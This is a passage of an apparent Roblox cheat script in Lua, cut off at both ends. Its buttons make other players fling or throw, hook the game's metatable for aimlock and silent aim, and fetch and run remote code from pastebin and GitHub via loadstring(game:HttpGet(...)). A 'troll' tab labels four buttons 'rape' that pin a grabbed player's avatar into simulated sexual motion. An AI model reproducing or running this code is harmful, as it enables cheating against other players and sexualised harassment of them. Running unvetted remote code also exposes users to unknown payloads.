                    local KIckAnim = Instance.new('Animation');
                    KIckAnim.AnimationId = "rbxassetid://3355740058";
                        tool = Instance.new("Tool")
                        tool.RequiresHandle = false
                        tool.Name = "hold"
                        tool.Activated:Connect(function()
                           Play(2848703459)
                            game.ReplicatedStorage.MainEvent:FireServer("Grabbing",true)
                        wait(0.1)
                        Call()
                        end)
                        tool.Parent = game.Players.LocalPlayer.Backpack
                    end;
                    game:GetService('Players').LocalPlayer.Character:WaitForChild('FULLY_LOADED_CHAR');
                    kick()
            end)

Section:NewButton("throw fling", "fling the grabbed person", function()
--//------------------------------------------------------------------------------------------\\-- SOUND FIXED BY ticxyylolz#9164
TweenService = game:GetService("TweenService")
OWNER = game:GetService("Players").LocalPlayer
--//------------------------------------------------------------------------------------------\\--
local OriginalKeyUpValue = 0
function StopAudio()
    game:GetService("ReplicatedStorage"):WaitForChild("MainEvent"):FireServer("BoomboxStop")
end
--//------------------------------------------------------------------------------------------\\--
function stop(ID, Key)
    local cor = coroutine.wrap(function()
        wait(OWNER.Character.LowerTorso.BOOMBOXSOUND.TimeLength-0.1)
        if OWNER.Character.LowerTorso.BOOMBOXSOUND.SoundId == "rbxassetid://"..ID and OriginalKeyUpValue == Key then
            StopAudio()
        end
    end)
    cor()
end
--//------------------------------------------------------------------------------------------\\--
function Play(ID)
    if OWNER.Backpack:FindFirstChild("[Boombox]") then
        local Tool = nil
        OWNER.Backpack["[Boombox]"].Parent = OWNER.Character
        game.ReplicatedStorage.MainEvent:FireServer("Boombox", ID)
        OWNER.Character["[Boombox]"].RequiresHandle = false
        OWNER.Character["[Boombox]"].Parent = OWNER.Backpack
        OWNER.PlayerGui.MainScreenGui.BoomboxFrame.Visible = false
        if Tool ~= true then
            if Tool then
                Tool.Parent = OWNER.Character
            end
        end
        OWNER.Character.LowerTorso:WaitForChild("BOOMBOXSOUND")
            local cor = coroutine.wrap(function()
                repeat wait() until OWNER.Character.LowerTorso.BOOMBOXSOUND.SoundId == "rbxassetid://"..ID and OWNER.Character.LowerTorso.BOOMBOXSOUND.TimeLength > 0.01
                OriginalKeyUpValue = OriginalKeyUpValue+1
                stop(ID, OriginalKeyUpValue)
            end)
        cor()
    end
end

                    function kick()
                        local KIckAnim = Instance.new('Animation');
                        KIckAnim.AnimationId = "rbxassetid://3096047107";
                            tool = Instance.new("Tool")
                            tool.RequiresHandle = false
                            tool.Name = "Super Throw"
                            tool.Activated:Connect(function()
                                game:GetService('Players').LocalPlayer.Character:FindFirstChildWhichIsA('Humanoid'):LoadAnimation(KIckAnim):Play()
                                wait(0.3)
                               Play(2174940386)
                                game.ReplicatedStorage.MainEvent:FireServer("Grabbing")
                            end)
                            tool.Parent = game.Players.LocalPlayer.Backpack
                    
                        end;
                        game:GetService('Players').LocalPlayer.Character:WaitForChild('FULLY_LOADED_CHAR');
                        kick()
                    
                        getgenv().POWERFLING = 800
                    
                     
                    
                        game:GetService("RunService").heartbeat:Connect(function()
                            for _, v in next, game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):GetPlayingAnimationTracks() do
                                if (v.Animation.AnimationId:match("rbxassetid://3096047107")) then
                                    local Vel = game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity
                                    game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.LookVector.X*getgenv().POWERFLING,game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.LookVector.Z*getgenv().POWERFLING)
                                    game:GetService("RunService").RenderStepped:Wait()
                                    game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vel
                                end
                            end
                        end)
                end)

Section:NewButton("instant throw", "fling the grabbed person", function()
--//------------------------------------------------------------------------------------------\\-- SOUND FIXED BY ticxyylolz#9164
TweenService = game:GetService("TweenService")
OWNER = game:GetService("Players").LocalPlayer
--//------------------------------------------------------------------------------------------\\--
local OriginalKeyUpValue = 0
function StopAudio()
    game:GetService("ReplicatedStorage"):WaitForChild("MainEvent"):FireServer("BoomboxStop")
end
--//------------------------------------------------------------------------------------------\\--
function stop(ID, Key)
    local cor = coroutine.wrap(function()
        wait(OWNER.Character.LowerTorso.BOOMBOXSOUND.TimeLength-0.1)
        if OWNER.Character.LowerTorso.BOOMBOXSOUND.SoundId == "rbxassetid://"..ID and OriginalKeyUpValue == Key then
            StopAudio()
        end
    end)
    cor()
end
--//------------------------------------------------------------------------------------------\\--
function Play(ID)
    if OWNER.Backpack:FindFirstChild("[Boombox]") then
        local Tool = nil
        OWNER.Backpack["[Boombox]"].Parent = OWNER.Character
        game.ReplicatedStorage.MainEvent:FireServer("Boombox", ID)
        OWNER.Character["[Boombox]"].RequiresHandle = false
        OWNER.Character["[Boombox]"].Parent = OWNER.Backpack
        OWNER.PlayerGui.MainScreenGui.BoomboxFrame.Visible = false
        if Tool ~= true then
            if Tool then
                Tool.Parent = OWNER.Character
            end
        end
        OWNER.Character.LowerTorso:WaitForChild("BOOMBOXSOUND")
            local cor = coroutine.wrap(function()
                repeat wait() until OWNER.Character.LowerTorso.BOOMBOXSOUND.SoundId == "rbxassetid://"..ID and OWNER.Character.LowerTorso.BOOMBOXSOUND.TimeLength > 0.01
                OriginalKeyUpValue = OriginalKeyUpValue+1
                stop(ID, OriginalKeyUpValue)
            end)
        cor()
    end
end

                    function kick()
                        local KIckAnim = Instance.new('Animation');
                        KIckAnim.AnimationId = "rbxassetid://3096047107";
                            tool = Instance.new("Tool")
                            tool.RequiresHandle = false
                            tool.Name = "Throw"
                            tool.Activated:Connect(function()
                                game:GetService('Players').LocalPlayer.Character:FindFirstChildWhichIsA('Humanoid'):LoadAnimation(KIckAnim):Play()
                                wait(.1)
                                for i , v in pairs(game.Players[tostring(game.Players.LocalPlayer.Character.BodyEffects.Grabbed.Value)].Character:GetChildren()) do
                                    if v:IsA("MeshPart") then
                                        v.CFrame =  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(100, 0, 0)
                                    end
                                    end
                                wait(0.1)
                                game.ReplicatedStorage.MainEvent:FireServer("Grabbing")
                                Ringtone(2174940386)
                            end)
                            tool.Parent = game.Players.LocalPlayer.Backpack
                    
                        end;
                        game:GetService('Players').LocalPlayer.Character:WaitForChild('FULLY_LOADED_CHAR');
                        kick()
                    
                        getgenv().POWERFLING = 400
                    
                     
                    
                        game:GetService("RunService").heartbeat:Connect(function()
                            for _, v in next, game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):GetPlayingAnimationTracks() do
                                if (v.Animation.AnimationId:match("rbxassetid://3096047107")) then
                                    local Vel = game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity
                                    game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.LookVector.X*getgenv().POWERFLING,game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.LookVector.Z*getgenv().POWERFLING)
                                    game:GetService("RunService").RenderStepped:Wait()
                                    game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vel
                                end
                            end
                        end)
                end)

Section:NewButton("Drooling Zombie Animation With Tool", "ButtonInfo", function()
local Animate = game.Players.LocalPlayer.Character.Animate
Animate.idle.Animation1.AnimationId = "rbxassetid://3489171152"
Animate.idle.Animation2.AnimationId = ""
Animate.walk.WalkAnim.AnimationId = "rbxassetid://3489174223"
Animate.run.RunAnim.AnimationId = "rbxassetid://3489173414"
Animate.jump.JumpAnim.AnimationId = "rbxassetid://616161997"
Animate.climb.ClimbAnim.AnimationId = ""
Animate.fall.FallAnim.AnimationId = ""
game.Players.LocalPlayer.Character.Humanoid.Jump = false

mouse = game.Players.LocalPlayer:GetMouse()
tool = Instance.new("Tool")
tool.RequiresHandle = false
tool.Name = "Attack"
tool.Activated:connect(function()
local pos = mouse.Hit+Vector3.new(0,2.5,0)
pos = CFrame.new(pos.X,pos.Y,pos.Z)
plr = game:GetService('Players').LocalPlayer
local anim = Instance.new("Animation")
anim.AnimationId = "rbxassetid://3489169607"

local track = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid").Animator:LoadAnimation(anim)
track.Looped = false
track:Play()
end)
tool.Parent = game.Players.LocalPlayer.Backpack

end)

local Tab = Window:NewTab("Aimlock")
local Section = Tab:NewSection("Best Aimlocks Tools!")

Section:NewButton("Resolver", "disables anti locks", function()
--> Services <--
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

--> Anti-Lock Resolver Toggle <--
getgenv().Resolver = true

--> Anti-Lock Resolver Function <--
if getgenv().Resolver then                      
    RunService.Heartbeat:Connect(function()      
        pcall(function()
            for _, allplayers in pairs(Players:GetChildren()) do                                      
                if allplayers ~= Players.LocalPlayer and allplayers.Character and allplayers.Character:FindFirstChild("HumanoidRootPart") then
                    local AllPlayersHumanoidRootPart = allplayers.Character.HumanoidRootPart

                    AllPlayersHumanoidRootPart.Velocity = Vector3.new(0, 0, 0)
                    AllPlayersHumanoidRootPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                end                    
            end
        end)  
    end)                      
end
end)

Section:NewButton("OG Aimlock Tool", "ButtonInfo", function()
mouse = game.Players.LocalPlayer:GetMouse()
tool = Instance.new("Tool")
tool.RequiresHandle = false
tool.Name = "OG Aimlock Tool 1"
tool.Activated:connect(function()
local pos = mouse.Hit+Vector3.new(0,2.5,0)
pos = CFrame.new(pos.X,pos.Y,pos.Z)
local vim = game:service("VirtualInputManager")
vim:SendKeyEvent(true, "C", false, game)
end)
tool.Parent = game.Players.LocalPlayer.Backpack

-- Toggle
getgenv().Target = true

-- Configuration
getgenv().Key = Enum.KeyCode.C
getgenv().Prediction = 0.1393
getgenv().ChatMode = false
getgenv().NotifMode = true
    getgenv().PartMode = true
    getgenv().AirshotFunccc = false
    getgenv().Partz = "HumanoidRootPart"
getgenv().AutoPrediction = false
getgenv().Fov = 70
getgenv().Circle = true
--
    _G.Types = {
        Ball = Enum.PartType.Ball,
        Block = Enum.PartType.Block, 
        Cylinder = Enum.PartType.Cylinder
    }
    
    --variables                 
    	local Tracer = Instance.new("Part", game.Workspace)
    Tracer.Name = "ogtool"	
    Tracer.Anchored = true		
    Tracer.CanCollide = false
    Tracer.Transparency = 0.7
    Tracer.Parent = game.Workspace	
    Tracer.Shape = _G.Types.Block
    Tracer.Size = Vector3.new(7,7,7)
    Tracer.Color = Color3.fromRGB(0,0,0)
    
    --
    local plr = game.Players.LocalPlayer
local mouse = plr:GetMouse()
local Runserv = game:GetService("RunService")

circle = Drawing.new("Circle")
circle.Color = Color3.fromRGB(0,0,0)
circle.Thickness = 0
circle.NumSides = 732
circle.Radius = getgenv().Fov
circle.Thickness = 0
circle.Transparency = 0
circle.Visible = getgenv().Circle
circle.Filled = false

Runserv.RenderStepped:Connect(function()
    circle.Position = Vector2.new(mouse.X,mouse.Y+35)
    if getgenv().AirshotFunccc == true then
            if Plr ~= nil then else return; end
            if Plr.Character.Humanoid.Jump == true and Plr.Character.Humanoid.FloorMaterial == Enum.Material.Air then
                getgenv().Partz = "RightFoot"
            else
                Plr.Character:WaitForChild("Humanoid").StateChanged:Connect(function(old,new)
                    if new == Enum.HumanoidStateType.Freefall then
                    getgenv().Partz = "RightFoot"
                    else
                        getgenv().Partz = "HumanoidRootPart"
                    end
                end)
            end
end
end)
    
    	local guimain = Instance.new("Folder", game.CoreGui)
    	local CC = game:GetService"Workspace".CurrentCamera
    local LocalMouse = game.Players.LocalPlayer:GetMouse()
    	local Locking = false
    
    	
    --
    if getgenv().valiansh == true then
                        game.StarterGui:SetCore("SendNotification", {
                   Title = "og lock",
                   Text = "Aimlock Tool Loaded!.",
                   Duration = 5
        
                   })
        return
    end
    
    getgenv().valiansh = true
    
        local UserInputService = game:GetService("UserInputService")

    UserInputService.InputBegan:Connect(function(keygo,ok)
           if (not ok) then
           if (keygo.KeyCode == getgenv().Key) then
               if getgenv().Target == true then
               Locking = not Locking
               
               if Locking then
               Plr =  getClosestPlayerToCursor()
                if getgenv().ChatMode then
        local A_1 = ""..tostring(Plr.Character.Humanoid.DisplayName) local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) 
        	end	
               if getgenv().NotifMode then
    			game.StarterGui:SetCore("SendNotification", {
        Title = "Player Locked!";
        Text = ""..tostring(Plr.Character.Humanoid.DisplayName);
    
    })
    end
    elseif not Locking then
         if getgenv().ChatMode then
        local A_1 = "" local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) 
        	end	
        if getgenv().NotifMode then
                        game.StarterGui:SetCore("SendNotification", {
                   Title = "OG Gui",
                   Text = "Player Unlocked!",
                   Duration = 5
               })
           elseif getgenv().Target == false then
                        game.StarterGui:SetCore("SendNotification", {
                   Title = "",
                   Text = "Target Left Or Died ",
                   Duration = 5
     
                   })
               
               end
                  
 
 end     end   
end
end
end)
	
	function getClosestPlayerToCursor()
		local closestPlayer
		local shortestDistance = circle.Radius

		for i, v in pairs(game.Players:GetPlayers()) do
			if v ~= game.Players.LocalPlayer and v.Character and v.Character:FindFirstChild("Humanoid") and v.Character.Humanoid.Health ~= 0 and v.Character:FindFirstChild("LowerTorso") then
				local pos = CC:WorldToViewportPoint(v.Character.PrimaryPart.Position)
				local magnitude = (Vector2.new(pos.X, pos.Y) - Vector2.new(LocalMouse.X, LocalMouse.Y)).magnitude
				if magnitude < shortestDistance then
					closestPlayer = v
					shortestDistance = magnitude
				end
			end
		end
		return closestPlayer
	end
--
if getgenv().PartMode then
	game:GetService"RunService".Stepped:connect(function()
		if Locking and Plr.Character and Plr.Character:FindFirstChild("LowerTorso") then
			Tracer.CFrame = CFrame.new(Plr.Character.LowerTorso.Position+(Plr.Character.LowerTorso.Velocity*Prediction))
		else
			Tracer.CFrame = CFrame.new(0, 9999, 0)
		end
	end)
end

    
    
    --
	local rawmetatable = getrawmetatable(game)
	local old = rawmetatable.__namecall
	setreadonly(rawmetatable, false)
	rawmetatable.__namecall = newcclosure(function(...)
		local args = {...}
		if Locking and getnamecallmethod() == "FireServer" and args[2] == "UpdateMousePos" then
			args[3] = Plr.Character[getgenv().Partz].Position+(Plr.Character[getgenv().Partz].Velocity*Prediction)
			return old(unpack(args))
		end
		return old(...)
	end)
---
	while wait() do
	if getgenv().AutoPrediction == true then
        local pingvalue = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
        local split = string.split(pingvalue,'(')
        local ping = tonumber(split[1])
        if ping < 130 then
            getgenv().Prediction = 0.151
        elseif ping < 125 then
            getgenv().Prediction = 0.149
        elseif ping < 110 then
            getgenv().Prediction = 0.140
        elseif ping < 105 then
            getgenv().Prediction = 0.133
        elseif ping < 90 then
            getgenv().Prediction = 0.130
        elseif ping < 80 then
            getgenv().Prediction = 0.128
        elseif ping < 70 then
            getgenv().Prediction = 0.1230
        elseif ping < 60 then
            getgenv().Prediction = 0.1229
        elseif ping < 50 then
            getgenv().Prediction = 0.1225
        elseif ping < 40 then
            getgenv().Prediction = 0.1256
        end
	end
    end
end)

Section:NewButton("OG target Aimlock Tool", "ButtonInfo", function()
loadstring(game:HttpGet("https://pastebin.com/raw/3ViK4zBC"))();
end)

Section:NewButton("OG Silent aim", "op", function()
-- Settings
getgenv().HitPart = "HumanoidRootPart"
getgenv().Prediction = 0.1485436
getgenv().Enabled = true

-- FOV settings
getgenv().ShowFOV = true
getgenv().Filled = false
getgenv().FOVSize = 150
getgenv().FOVTransparency = 0.1
getgenv().FOVThickness = 2.0
getgenv().FOVColor = Color3.new(0, 0, 0)

-- FOV circle creation
SilentAimFOVCircle = Drawing.new("Circle")
SilentAimFOVCircle.Color = getgenv().FOVColor
SilentAimFOVCircle.Visible = getgenv().ShowFOV
SilentAimFOVCircle.Filled = getgenv().Filled
SilentAimFOVCircle.Radius = getgenv().FOVSize
SilentAimFOVCircle.Transparency = getgenv().FOVTransparency
SilentAimFOVCircle.Thickness = getgenv().FOVThickness

-- Services
Players = game:GetService("Players")
Camera = workspace.CurrentCamera

-- Calculate circle position
SilentAimFOVCircle.Position = Vector2.new(workspace.CurrentCamera.ViewportSize.X / 2, workspace.CurrentCamera.ViewportSize.Y / 2 - (game:GetService("GuiService"):GetGuiInset().Y / 2))

-- Function to find the closest player to the center of the screen
local function getClosestPlayerToCenter()
    local centerScreenPosition = Vector2.new(workspace.CurrentCamera.ViewportSize.X / 2, workspace.CurrentCamera.ViewportSize.Y / 2 - (game:GetService("GuiService"):GetGuiInset().Y / 2))
    local closestPlayer
    local closestDistance = math.huge
    local localPlayer = game.Players.LocalPlayer

    for _, player in ipairs(game.Players:GetPlayers()) do
        if player ~= localPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            local playerRootPart = player.Character.HumanoidRootPart
            local screenPosition, onScreen = workspace.CurrentCamera:WorldToViewportPoint(playerRootPart.Position)

            if onScreen then
                local distance = (centerScreenPosition - Vector2.new(screenPosition.X, screenPosition.Y)).Magnitude

                if distance < closestDistance and distance <= SilentAimFOVCircle.Radius then
                    local ray = Ray.new(Camera.CFrame.Position, (playerRootPart.Position - Camera.CFrame.Position).Unit * 300)
                    local part, position = workspace:FindPartOnRay(ray, localPlayer.Character, false, true)

                    if part and part:IsDescendantOf(player.Character) then
                        if player.Character.Humanoid.Health > 0 then
                            closestPlayer = player
                            closestDistance = distance
                        end
                    end
                end
            end
        end
    end

    return closestPlayer
end

-- Store the closest player to the center of the screen
local SilentTarget = nil

-- Listen for render stepped to update the closest player
game:GetService("RunService").RenderStepped:Connect(function()
    SilentTarget = getClosestPlayerToCenter()
end)

-- Metatable manipulation to implement silent aim
local mt = getrawmetatable(game)
local old = mt.__namecall
setreadonly(mt, false)
mt.__namecall = newcclosure(function(...)
    local args = {...}
    if getgenv().Enabled and SilentTarget ~= nil and SilentTarget.Character and getnamecallmethod() == "FireServer" and args[2] == "UpdateMousePos" then
        args[3] = SilentTarget.Character[getgenv().HitPart].Position + (SilentTarget.Character[getgenv().HitPart].Velocity * getgenv().Prediction)
        return old(unpack(args))
    end
    return old(...)
end)
end)

Section:NewButton("paid aimlock tool", "ButtonInfo", function()
loadstring(game:HttpGet("https://pastebin.com/raw/2NDnWXBj"))();
end)

Section:NewButton("camlock tool", "ButtonInfo", function()

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()

local tool = Instance.new("Tool")
tool.RequiresHandle = false
tool.Name = "camlock"

local function respawnTool()
    local backpack = player.Backpack
    local existingTool = backpack:FindFirstChild(tool.Name)
    if not existingTool then
        tool.Parent = backpack
    end
end

tool.Activated:Connect(function()
    local pos = mouse.Hit + Vector3.new(0, 2.5, 0)
    pos = CFrame.new(pos.X, pos.Y, pos.Z)
    local vim = game:GetService("VirtualInputManager")
    vim:SendKeyEvent(true, "C", false, game)
end)

player.CharacterAdded:Connect(respawnTool)

respawnTool() -- Make sure tool persists if character already exists

loadstring(game:HttpGet("https://raw.githubusercontent.com/polarsblade/source/a61f3cbe6d1ee72699b8bc96bac74984b593bd2b/source"))();
end)

Section:NewButton("aura x Silent aim", "op", function()
getgenv().Silent = {
    Settings = {
        Enabled = true,
        AimPart = "UpperTorso",
        Prediction = 0.1433,
        WallCheck = true,
        Visualize = true,
        AutoPrediction = true,
    },
    FOV = {
        Enabled = true,
        Size = 30,
        Filled = false,
        Thickness = 0.66,
        Transparency = 0.9,
        Color = Color3.fromRGB(255,255,255),
    },
}
loadstring(game:HttpGet("https://raw.githubusercontent.com/CyberPlaysYT/Aura-x/main/Source", true))()
end)

local Tab = Window:NewTab("troll")
local Section = Tab:NewSection("troll")

Section:NewButton("rape", "rape the grabbed person", function()
local LocalPlayer = game.Players.LocalPlayer
local Character = LocalPlayer.Character

local IM = game:GetService("ReplicatedStorage").IM.ANIM

local PlayersChar = workspace.Players

if _G.JOINTWATCHER then
    _G.JOINTWATCHER:Disconnect()
end

local function Align(P0, P1, P, R)
    local A0, A1 = Instance.new("Attachment", P0), Instance.new("Attachment", P1)
    
    local AP, AO = Instance.new("AlignPosition", P0), Instance.new("AlignOrientation", P0)
    
    A1.Position = P
    A0.Rotation = R
    
    AP.RigidityEnabled = true
    AP.Responsiveness = 200
    AP.Attachment0 = A0
    AP.Attachment1 = A1
    
    AO.MaxTorque = 9e9
    AO.Responsiveness = 200
    AO.RigidityEnabled = true
    AO.Attachment0 = A0
    AO.Attachment1 = A1
    
    return A0, A1, AP, A0
end

_G.JOINTWATCHER = PlayersChar.DescendantAdded:Connect(function(Ins)
    if Ins:IsA("Weld") and Ins.Name == "GRABBING_CONSTRAINT" then
        repeat task.wait() until Ins.Part0 ~= nil
        repeat task.wait() until Ins:FindFirstChildOfClass("RopeConstraint")
        
        local AT0, AT1, AP, A0
        
        if Ins.Part0:IsDescendantOf(LocalPlayer.Character) then
            Ins:FindFirstChildOfClass("RopeConstraint").Length = 9e9
            
            Character.Animate.Disabled = true
            
            for _, Anim in pairs(Character.Humanoid:GetPlayingAnimationTracks()) do
                Anim:Stop()
            end
            
            Character.Animate.Disabled = false
            
            Character.Humanoid:LoadAnimation(IM.RightAim):Play()
            Character.Humanoid:LoadAnimation(IM.LeftAim):Play()
            
            AT0, AT1, AP, A0 = Align(Ins.Parent.UpperTorso, LocalPlayer.Character.UpperTorso, Vector3.new(0, 0, -2), Vector3.new(45, 0, 0))
            
            spawn(function()
                while Ins.Parent ~= nil do
                    task.wait()
                    local Sine = tick() * 60
                    
                    AT1.Position = Vector3.new(0, -0.5, -5 + 1 * math.sin(Sine / 8))
                end
            end)
        end
        
        repeat task.wait() until Ins.Parent == nil
        
        Character.Animate.Disabled = true
            
    for _, Anim in pairs(Character.Humanoid:GetPlayingAnimationTracks()) do
        Anim:Stop()
    end
    
    Character.Animate.Disabled = false
        
        AT0:Destroy()
        AT1:Destroy()
        AP:Destroy()
        A0:Destroy()
    end
end)
end)

Section:NewButton("rape v2", "rape v1 better", function()
local LocalPlayer = game.Players.LocalPlayer
        local Character = LocalPlayer.Character
        
        local IM = game:GetService("ReplicatedStorage").IM.ANIM
        
        local PlayersChar = workspace.Players
        
        if _G.JOINTWATCHER then
            _G.JOINTWATCHER:Disconnect()
        end
        
        local function Align(P0, P1, P, R)
            local A0, A1 = Instance.new("Attachment", P0), Instance.new("Attachment", P1)
            
            local AP, AO = Instance.new("AlignPosition", P0), Instance.new("AlignOrientation", P0)
            
            A1.Position = P
            A0.Rotation = R
            
            AP.RigidityEnabled = true
            AP.Responsiveness = 200
            AP.Attachment0 = A0
            AP.Attachment1 = A1
            
            AO.MaxTorque = 9e9
            AO.Responsiveness = 200
            AO.RigidityEnabled = true
            AO.Attachment0 = A0
            AO.Attachment1 = A1
            
            return A0, A1, AP, A0
        end
        
        _G.JOINTWATCHER = PlayersChar.DescendantAdded:Connect(function(Ins)
            if Ins:IsA("Weld") and Ins.Name == "GRABBING_CONSTRAINT" then
                repeat task.wait() until Ins.Part0 ~= nil
                repeat task.wait() until Ins:FindFirstChildOfClass("RopeConstraint")
                
                local AT0, AT1, AP, A0
                
                if Ins.Part0:IsDescendantOf(LocalPlayer.Character) then
                    Ins:FindFirstChildOfClass("RopeConstraint").Length = 9e9
                    
                    Character.Animate.Disabled = true
                    
                    for _, Anim in pairs(Character.Humanoid:GetPlayingAnimationTracks()) do
                        Anim:Stop()
                    end
                    
                    Character.Animate.Disabled = false
                    
                    Character.Humanoid:LoadAnimation(IM.RightAim):Play()
                    Character.Humanoid:LoadAnimation(IM.LeftAim):Play()
                    
                    AT0, AT1, AP, A0 = Align(Ins.Parent.UpperTorso, LocalPlayer.Character.UpperTorso, Vector3.new(0, 0, 10), Vector3.new(90, 545, 0))
                    
                    spawn(function()
                        while Ins.Parent ~= nil do
                            task.wait()
                            local Sine = tick() * 60
                            
                            AT1.Position = Vector3.new(0, -1.2, -5 + 1 * math.sin(Sine / 8))
                        end
                    end)
                end
                
                repeat task.wait() until Ins.Parent == nil
                
                Character.Animate.Disabled = true
                    
            for _, Anim in pairs(Character.Humanoid:GetPlayingAnimationTracks()) do
                Anim:Stop()
            end
            
            Character.Animate.Disabled = false
                
                AT0:Destroy()
                AT1:Destroy()
                AP:Destroy()
                A0:Destroy()
            end
        end)
end)

Section:NewButton("rape v3", "no bat required", function()
    local LocalPlayer = game.Players.LocalPlayer
local Character = LocalPlayer.Character

local IM = game:GetService("ReplicatedStorage").IM.ANIM

local PlayersChar = workspace.Players

if _G.JOINTWATCHER then
    _G.JOINTWATCHER:Disconnect()
end

local function Align(P0, P1, P, R)
    local A0, A1 = Instance.new("Attachment", P0), Instance.new("Attachment", P1)
    
    local AP, AO = Instance.new("AlignPosition", P0), Instance.new("AlignOrientation", P0)
    
    A1.Position = P
    A0.Rotation = R
    
    AP.RigidityEnabled = true
    AP.Responsiveness = 200
    AP.Attachment0 = A0
    AP.Attachment1 = A1
    
    AO.MaxTorque = 9e9
    AO.Responsiveness = 200
    AO.RigidityEnabled = true
    AO.Attachment0 = A0
    AO.Attachment1 = A1
    
    return A0, A1, AP, A0
end

_G.JOINTWATCHER = PlayersChar.DescendantAdded:Connect(function(Ins)
    if Ins:IsA("Weld") and Ins.Name == "GRABBING_CONSTRAINT" then
        repeat task.wait() until Ins.Part0 ~= nil
        repeat task.wait() until Ins:FindFirstChildOfClass("RopeConstraint")
        
        local AT0, AT1, AP, A0
        
        if Ins.Part0:IsDescendantOf(LocalPlayer.Character) then
            Ins:FindFirstChildOfClass("RopeConstraint").Length = 9e9
            
            Character.Animate.Disabled = true
            
            for _, Anim in pairs(Character.Humanoid:GetPlayingAnimationTracks()) do
                Anim:Stop()
            end
            
            Character.Animate.Disabled = false
            
            Character.Humanoid:LoadAnimation(IM.RightAim):Play()
            Character.Humanoid:LoadAnimation(IM.LeftAim):Play()
            
            AT0, AT1, AP, A0 = Align(Ins.Parent.UpperTorso, LocalPlayer.Character.UpperTorso, Vector3.new(0, 0, -2), Vector3.new(45, 0, 0))
            
            spawn(function()
                while Ins.Parent ~= nil do
                    task.wait()
                    local Sine = tick() * 60
                    
                    AT1.Position = Vector3.new(0, -0.5, -4 + 1 * math.sin(Sine / 8))
                end
            end)
        end
        
        repeat task.wait() until Ins.Parent == nil
        
        
        
        Character.Animate.Disabled = true
            
    for _, Anim in pairs(Character.Humanoid:GetPlayingAnimationTracks()) do
        Anim:Stop()
    end
    
    Character.Animate.Disabled = false
        
        AT0:Destroy()
        AT1:Destroy()
        AP:Destroy()
        A0:Destroy()
    end
end)
end)

Section:NewButton("rape v4", "idk", function()
    local LocalPlayer = game.Players.LocalPlayer
    local Character = LocalPlayer.Character
    
    local IM = game:GetService("ReplicatedStorage").IM.ANIM
    
    local PlayersChar = workspace.Players
    
    if _G.JOINTWATCHER then
        _G.JOINTWATCHER:Disconnect()
    end
    
    local function Align(P0, P1, P, R)
        local A0, A1 = Instance.new("Attachment", P0), Instance.new("Attachment", P1)
        
        local AP, AO = Instance.new("AlignPosition", P0), Instance.new("AlignOrientation", P0)
        
        A1.Position = P
        A0.Rotation = R
        
        AP.RigidityEnabled = true
        AP.Responsiveness = 200
        AP.Attachment0 = A0
        AP.Attachment1 = A1
        
        AO.MaxTorque = 9e9
        AO.Responsiveness = 200
        AO.RigidityEnabled = true
        AO.Attachment0 = A0
        AO.Attachment1 = A1
        
        return A0, A1, AP, A0
    end
    
    _G.JOINTWATCHER = PlayersChar.DescendantAdded:Connect(function(Ins)
        if Ins:IsA("Weld") and Ins.Name == "GRABBING_CONSTRAINT" then
            repeat task.wait() until Ins.Part0 ~= nil
            repeat task.wait() until Ins:FindFirstChildOfClass("RopeConstraint")
            
            local AT0, AT1, AP, A0
            
            if Ins.Part0:IsDescendantOf(LocalPlayer.Character) then
                Ins:FindFirstChildOfClass("RopeConstraint").Length = 9e9
                
                Character.Animate.Disabled = true
                
                for _, Anim in pairs(Character.Humanoid:GetPlayingAnimationTracks()) do
                    Anim:Stop()
                end
                
                Character.Animate.Disabled = false
                
                Character.Humanoid:LoadAnimation(IM.RightAim):Play()
                Character.Humanoid:LoadAnimation(IM.LeftAim):Play()
                
                AT0, AT1, AP, A0 = Align(Ins.Parent.UpperTorso, LocalPlayer.Character.UpperTorso, Vector3.new(0, 0, 10), Vector3.new(90, 545, 0))
                
                spawn(function()
                    while Ins.Parent ~= nil do
                        task.wait()
                        local Sine = tick() * 60
                        
                        AT1.Position = Vector3.new(0, -1.2, -4 + 1 * math.sin(Sine / 8))
                    end
                end)
            end
            
            repeat task.wait() until Ins.Parent == nil
            
            Character.Animate.Disabled = true
                
        for _, Anim in pairs(Character.Humanoid:GetPlayingAnimationTracks()) do
            Anim:Stop()
        end
        
        Character.Animate.Disabled = false
            
            AT0:Destroy()
            AT1:Destroy()
            AP:Destroy()
            A0:Destroy()
        end
    end)
end)

Section:NewButton("kiss grab", "kiss grab", function()
    local LocalPlayer = game.Players.LocalPlayer
local Character = LocalPlayer.Character

local IM = game:GetService("ReplicatedStorage").IM.ANIM

local PlayersChar = workspace.Players

if _G.JOINTWATCHER then
    _G.JOINTWATCHER:Disconnect()
end

local function Align(P0, P1, P, R)
    local A0, A1 = Instance.new("Attachment", P0), Instance.new("Attachment", P1)
    
    local AP, AO = Instance.new("AlignPosition", P0), Instance.new("AlignOrientation", P0)
    
    A1.Position = P
    A0.Rotation = R
    
    AP.RigidityEnabled = true
    AP.Responsiveness = 200
    AP.Attachment0 = A0
    AP.Attachment1 = A1
    
    AO.MaxTorque = 9e9
    AO.Responsiveness = 200
    AO.RigidityEnabled = true
    AO.Attachment0 = A0
    AO.Attachment1 = A1
    
    return A0, A1, AP, A0
end

